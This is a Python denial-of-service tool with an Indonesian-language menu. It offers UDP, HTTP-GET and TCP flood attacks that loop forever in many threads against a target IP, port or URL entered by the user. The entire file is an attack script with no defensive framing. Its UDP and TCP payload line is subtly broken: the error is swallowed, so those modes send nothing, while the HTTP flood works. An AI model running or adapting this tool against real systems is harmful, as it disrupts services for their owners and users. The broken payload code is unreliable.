import requests
import socket
import threading
import os

def ddos_udp(target_ip, target_port, threads):
    print(f"[*] Starting UDP Flood to {target_ip}:{target_port} with {threads} threads...")
    def attack():
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.sendto(bytes("".join(os.urandom(1024)), "utf-8"), (target_ip, target_port))
            except:
                pass
    for _ in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

def http_flood(target_url, threads):
    print(f"[*] Starting HTTP Flood to {target_url} with {threads} threads...")
    def attack():
        while True:
            try:
                requests.get(target_url)
            except:
                pass
    for _ in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

def ddos_attack(target_ip, target_port, threads):
    print(f"[*] Starting General DDoS Attack to {target_ip}:{target_port} with {threads} threads...")
    def attack():
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((target_ip, target_port))
                    s.send(bytes("".join(os.urandom(1024)), "utf-8"))
            except:
                pass
    for _ in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

def menu():
    print("Pilih jenis serangan:")
    print("1. UDP Flood")
    print("2. HTTP Flood")
    print("3. General DDoS Attack")
    print("4. Keluar")
    pilihan = input("Masukkan pilihan Anda: ")
    return pilihan

while True:
    pilihan = menu()

    if pilihan == '1':
        target_ip = input("Masukkan target IP: ")
        target_port = int(input("Masukkan target port: "))
        threads = int(input("Masukkan jumlah threads: "))
        ddos_udp(target_ip, target_port, threads)
    elif pilihan == '2':
        target_url = input("Masukkan target URL: ")
        threads = int(input("Masukkan jumlah threads: "))
        http_flood(target_url, threads)
    elif pilihan == '3':
        target_ip = input("Masukkan target IP: ")
        target_port = int(input("Masukkan target port: "))
        threads = int(input("Masukkan jumlah threads: "))
        ddos_attack(target_ip, target_port, threads)
    elif pilihan == '4':
        print("Keluar...")
        break
    else:
        print("Pilihan tidak valid.") 
